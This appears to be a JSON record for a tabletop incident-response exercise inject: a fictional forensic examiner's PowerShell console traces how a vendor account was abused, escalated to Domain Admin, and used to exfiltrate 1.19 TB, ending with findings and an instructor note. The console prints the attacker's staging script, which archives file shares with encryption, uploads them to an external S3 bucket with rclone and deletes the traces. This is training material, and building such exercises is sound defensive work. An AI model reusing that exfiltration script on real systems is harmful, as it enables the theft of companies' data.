@@ -1,0 +1,143 @@
+{
+  "id": "01M7936YN7AM8CX3CYYHEQ9JYN",
+  "mselRowId": "I-13",
+  "type": "console_dump",
+  "title": "Blackwater Cyber: Vendor Account to Domain Admin, 1.19 TB Out",
+  "deliveryMode": "hand_to_role",
+  "fields": {
+    "windowTitle": "Administrator: Windows PowerShell — BWC-FWS-11 — Case ICM-0325 (PRIVILEGED & CONFIDENTIAL)",
+    "host": "BWC-FWS-11",
+    "user": "bwc.examiner",
+    "cwd": "E:\\Cases\\ICM-0325",
+    "prompt": "PS E:\\Cases\\ICM-0325>",
+    "commands": [
+      {
+        "cmd": "# PRIVILEGED & CONFIDENTIAL. Attorney-client communication / attorney work product. Prepared by Blackwater Cyber at the direction of Harrow Fenn LLP. Case ICM-0325, Thu 2027-03-25 21:00 CT. For the CISO and General Counsel, Ironcrest Machinery Corporation, only.",
+        "output": "",
+        "error": false
+      },
+      {
+        "cmd": "Select-String -Path .\\Evidence\\ICM-RA-01\\gateway_auth_20270322.log -Pattern 'svc_wmsvendor'",
+        "output": "gateway_auth_20270322.log:4471:2027-03-22 23:14:31 CT LOGON FAILURE user=svc_wmsvendor src=203.0.113.87 proto=RDP-GW MFA=required reason=mfa_not_completed\ngateway_auth_20270322.log:4472:2027-03-22 23:14:52 CT LOGON SUCCESS user=svc_wmsvendor src=203.0.113.87 MFA=bypass(legacy-protocol) proto=NTLM-basic\ngateway_auth_20270322.log:4473:2027-03-22 23:14:58 CT SESSION OPEN user=svc_wmsvendor src=203.0.113.87 -> RDP ICM-FS-04:3389\ngateway_auth_20270322.log:4519:2027-03-23 02:41:16 CT SESSION CLOSE user=svc_wmsvendor src=203.0.113.87 duration=03:26:18",
+        "error": false
+      },
+      {
+        "cmd": "Get-WinEvent -Path .\\Evidence\\DC\\Security_export_20270325.evtx -FilterXPath \"*[System[EventID=4728]]\" | Where-Object { $_.Message -match 'svc_wmsvendor' } | Format-List TimeCreated, Id, Message",
+        "output": "TimeCreated : 3/22/2027 11:31:07 PM\nId : 4728\nMessage : A member was added to a security-enabled global group.\n Subject:\n Account Name: svc_wmsvendor\n Account Domain: IRONCREST\n Member:\n Account Name: IRONCREST\\svc_wmsvendor\n Group:\n Group Name: Domain Admins\n Group Domain: IRONCREST",
+        "error": false
+      },
+      {
+        "cmd": "Get-Content .\\Evidence\\ICM-FS-04\\C\\ProgramData\\svcupd\\stage_out.ps1",
+        "output": "# svc update helper\n$src = @('\\\\ICM-FS-04\\Engineering\\Released',\n '\\\\ICM-FS-03\\HR\\Exports',\n '\\\\ICM-FS-03\\Finance\\Close')\n$stage = 'C:\\ProgramData\\svcupd\\tmp'\nforeach ($s in $src) {\n $tag = ($s -split '\\\\')[-2..-1] -join '_'\n Get-ChildItem $s -Recurse -File | Select-Object -Expand FullName | Out-File \"$stage\\$tag.lst\"\n & 'C:\\Program Files\\7-Zip\\7z.exe' a -v2g -mhe=on -p\"$env:SVCK\" \"$stage\\$tag.7z\" \"@$stage\\$tag.lst\"\n & 'C:\\ProgramData\\svcupd\\rcl.exe' copy $stage s3remote:bkt-7731/$tag --transfers 16\n Remove-Item \"$stage\\$tag*\" -Force\n}",
+        "error": false
+      },
+      {
+        "cmd": "Import-Csv .\\Evidence\\ICM-FS-04\\rcl_transfer_reconstructed.csv | Group-Object Share | Select-Object Name, @{n='First (CT)';e={($_.Group.Start | Sort-Object)[0]}}, @{n='Last (CT)';e={($_.Group.End | Sort-Object)[-1]}}, @{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}} | Format-Table -AutoSize",
+        "output": "Name First (CT) Last (CT) GB\n---- ---------- --------- --\nFinance_Close 2027-03-23 00:12:44 2027-03-23 02:29:03 251\nEngineering_Released 2027-03-23 22:47:11 2027-03-24 01:58:37 742\nHR_Exports 2027-03-23 23:58:40 2027-03-24 02:51:19 198\n\nTotal: 1,191 GB (1.19 TB) to s3remote:bkt-7731",
+        "error": false
+      },
+      {
+        "cmd": "Get-Content .\\Notes\\ICM-0325_Findings_20270325_2100.txt",
+        "output": "CONFIRMED\n - Abuse of svc_wmsvendor, the Joliet warehouse software vendor's support account, from 203.0.113.87 via legacy-protocol MFA bypass, 2027-03-22 23:14:52 CT. Vendor states no technician was working that night.\n - Domain-admin compromise: svc_wmsvendor added to Domain Admins 23:31:07 CT.\n - Exfiltration of about 1.2 TB (1.19 TB) from Engineering Released (742 GB), HR Exports (198 GB) and Finance Close (251 GB), 22-24 March. Finance Close is a category not in our 18:55 update. Total matches the attackers' 1.2 TB claim.\nUNKNOWN\n - Which drawings and how many personnel records were taken; which close files.\n - Whether the attackers still hold valid credentials.\nRECOMMENDATION\n - Disable svc_wmsvendor and all vendor remote-access accounts on ICM-RA-01 now.\n - Reset krbtgt twice, with replication between resets, before any rebuild.\n - Lead examiner, Blackwater Cyber",
+        "error": false
+      }
+    ],
+    "showCursor": true
+  },
+  "variant": "powershell",
+  "instructorNote": "This clue shows that identity is compromised and that a third data category, Finance close, was taken. Watch whether the CISO disables vendor access, puts the identity rebuild first and does not contact the attackers, sends indicators only through the GC's FBI channel, and tells the GC within the hour. Also watch whether the GC reopens the 19:00 determination and records the update for the Disclosure Committee.",
+  "citations": [
+    {
+      "documentId": "01M791NWETPNJ2B6DP42BR9D8C",
+      "documentTitle": "ICM-BCM-02: Business Impact Analysis and Recovery Order",
+      "headingPath": "IBIARO › 4. Recovery order",
+      "quote": "1. Safety and life safety at all sites (plant security, fire and gas systems are on separate networks and are not affected by IT failures, and are verified first). 2. Identity and the network core (di",
+      "chunkId": 14
+    },
+    {
+      "documentId": "01M791NWETPNJ2B6DP42BR9D8C",
+      "documentTitle": "ICM-BCM-02: Business Impact Analysis and Recovery Order",
+      "headingPath": "IBIARO › 6. Key suppliers and vendors",
+      "quote": "The company's cloud provider, the payroll provider (Northbridge Payroll, fictional), the outside data center and network carriers, the warehouse software vendor, the steel supplier, the forensic firm ",
+      "chunkId": 16
+    }
+  ],
+  "mediaBrief": {
+    "paths": [
+      "template"
+    ]
+  },
+  "assets": [
+    {
+      "id": "01M79BVRB7W8FFDJHX9668XFTD",
+      "kind": "image",
+      "path": "scenarios/01M791NYFD5GNSAF0J0E4J4T0E/media/01M7936YN7AM8CX3CYYHEQ9JYN/01M79BVRB7W8FFDJHX9668XFTD.png",
+      "role": "rendered",
+      "width": 1100,
+      "height": 1358,
+      "sha256": "63b833f264a0d4e13222d979f12f29e989f3ef4b8d05ddc76cf9c9632cc0fdde",
+      "provenance": {
+        "provider": "template",
+        "templateId": "console_dump",
+        "templateVersion": "1",
+        "createdAt": "2026-11-13T02:30:21.587Z"
+      }
+    }
+  ],
+  "versions": [
+    {
+      "at": "2026-11-13T00:00:27.383Z",
+      "by": "ai",
+      "note": "generated",
+      "snapshot": {
+        "title": "Blackwater Cyber: Vendor Account to Domain Admin, 1.19 TB Out",
+        "type": "console_dump",
+        "fields": {
+          "windowTitle": "Administrator: Windows PowerShell — BWC-FWS-11 — Case ICM-0325 (PRIVILEGED & CONFIDENTIAL)",
+          "host": "BWC-FWS-11",
+          "user": "bwc.examiner",
+          "cwd": "E:\\Cases\\ICM-0325",
+          "prompt": "PS E:\\Cases\\ICM-0325>",
+          "commands": [
+            {
+              "cmd": "# PRIVILEGED & CONFIDENTIAL. Attorney-client communication / attorney work product. Prepared by Blackwater Cyber at the direction of Harrow Fenn LLP. Case ICM-0325, Thu 2027-03-25 21:00 CT. For the CISO and General Counsel, Ironcrest Machinery Corporation, only.",
+              "output": "",
+              "error": false
+            },
+            {
+              "cmd": "Select-String -Path .\\Evidence\\ICM-RA-01\\gateway_auth_20270322.log -Pattern 'svc_wmsvendor'",
+              "output": "gateway_auth_20270322.log:4471:2027-03-22 23:14:31 CT LOGON FAILURE user=svc_wmsvendor src=203.0.113.87 proto=RDP-GW MFA=required reason=mfa_not_completed\ngateway_auth_20270322.log:4472:2027-03-22 23:14:52 CT LOGON SUCCESS user=svc_wmsvendor src=203.0.113.87 MFA=bypass(legacy-protocol) proto=NTLM-basic\ngateway_auth_20270322.log:4473:2027-03-22 23:14:58 CT SESSION OPEN user=svc_wmsvendor src=203.0.113.87 -> RDP ICM-FS-04:3389\ngateway_auth_20270322.log:4519:2027-03-23 02:41:16 CT SESSION CLOSE user=svc_wmsvendor src=203.0.113.87 duration=03:26:18",
+              "error": false
+            },
+            {
+              "cmd": "Get-WinEvent -Path .\\Evidence\\DC\\Security_export_20270325.evtx -FilterXPath \"*[System[EventID=4728]]\" | Where-Object { $_.Message -match 'svc_wmsvendor' } | Format-List TimeCreated, Id, Message",
+              "output": "TimeCreated : 3/22/2027 11:31:07 PM\nId : 4728\nMessage : A member was added to a security-enabled global group.\n Subject:\n Account Name: svc_wmsvendor\n Account Domain: IRONCREST\n Member:\n Account Name: IRONCREST\\svc_wmsvendor\n Group:\n Group Name: Domain Admins\n Group Domain: IRONCREST",
+              "error": false
+            },
+            {
+              "cmd": "Get-Content .\\Evidence\\ICM-FS-04\\C\\ProgramData\\svcupd\\stage_out.ps1",
+              "output": "# svc update helper\n$src = @('\\\\ICM-FS-04\\Engineering\\Released',\n '\\\\ICM-FS-03\\HR\\Exports',\n '\\\\ICM-FS-03\\Finance\\Close')\n$stage = 'C:\\ProgramData\\svcupd\\tmp'\nforeach ($s in $src) {\n $tag = ($s -split '\\\\')[-2..-1] -join '_'\n Get-ChildItem $s -Recurse -File | Select-Object -Expand FullName | Out-File \"$stage\\$tag.lst\"\n & 'C:\\Program Files\\7-Zip\\7z.exe' a -v2g -mhe=on -p\"$env:SVCK\" \"$stage\\$tag.7z\" \"@$stage\\$tag.lst\"\n & 'C:\\ProgramData\\svcupd\\rcl.exe' copy $stage s3remote:bkt-7731/$tag --transfers 16\n Remove-Item \"$stage\\$tag*\" -Force\n}",
+              "error": false
+            },
+            {
+              "cmd": "Import-Csv .\\Evidence\\ICM-FS-04\\rcl_transfer_reconstructed.csv | Group-Object Share | Select-Object Name, @{n='First (CT)';e={($_.Group.Start | Sort-Object)[0]}}, @{n='Last (CT)';e={($_.Group.End | Sort-Object)[-1]}}, @{n='GB';e={[math]::Round(($_.Group | Measure-Object Bytes -Sum).Sum/1GB,0)}} | Format-Table -AutoSize",
+              "output": "Name First (CT) Last (CT) GB\n---- ---------- --------- --\nFinance_Close 2027-03-23 00:12:44 2027-03-23 02:29:03 251\nEngineering_Released 2027-03-23 22:47:11 2027-03-24 01:58:37 742\nHR_Exports 2027-03-23 23:58:40 2027-03-24 02:51:19 198\n\nTotal: 1,191 GB (1.19 TB) to s3remote:bkt-7731",
+              "error": false
+            },
+            {
+              "cmd": "Get-Content .\\Notes\\ICM-0325_Findings_20270325_2100.txt",
+              "output": "CONFIRMED\n - Abuse of svc_wmsvendor, the Joliet warehouse software vendor's support account, from 203.0.113.87 via legacy-protocol MFA bypass, 2027-03-22 23:14:52 CT. Vendor states no technician was working that night.\n - Domain-admin compromise: svc_wmsvendor added to Domain Admins 23:31:07 CT.\n - Exfiltration of about 1.2 TB (1.19 TB) from Engineering Released (742 GB), HR Exports (198 GB) and Finance Close (251 GB), 22-24 March. Finance Close is a category not in our 18:55 update. Total matches the attackers' 1.2 TB claim.\nUNKNOWN\n - Which drawings and how many personnel records were taken; which close files.\n - Whether the attackers still hold valid credentials.\nRECOMMENDATION\n - Disable svc_wmsvendor and all vendor remote-access accounts on ICM-RA-01 now.\n - Reset krbtgt twice, with replication between resets, before any rebuild.\n - Lead examiner, Blackwater Cyber",
+              "error": false
+            }
+          ],
+          "showCursor": true
+        },
+        "instructorNote": "This clue shows that identity is compromised and that a third data category, Finance close, was taken. Watch whether the CISO disables vendor access, puts the identity rebuild first and does not contact the attackers, sends indicators only through the GC's FBI channel, and tells the GC within the hour. Also watch whether the GC reopens the 19:00 determination and records the update for the Disclosure Committee.",
+        "deliveryMode": "hand_to_role"
+      }
+    }
+  ],
+  "includeInDeck": true,
+  "locked": false,
+  "updatedAt": "2026-11-13T02:30:21.800Z"
+}
